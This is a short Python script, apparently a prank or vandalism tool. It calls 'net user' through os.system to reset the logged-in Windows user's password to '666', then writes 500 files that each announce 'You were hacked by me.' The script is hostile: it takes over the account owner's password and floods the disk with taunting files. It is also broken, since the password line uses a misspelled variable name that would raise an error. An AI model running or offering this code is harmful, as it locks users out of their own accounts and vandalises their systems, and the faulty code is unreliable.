import os

UserName = os.getlogin()
os.system('net user %s 666'%(UserNmae))
for i in range(1, 500):
    with open('./hacker%d.hack'%(i),'w') as f :
        f.write('You were hacked by me.')

print('Done!')
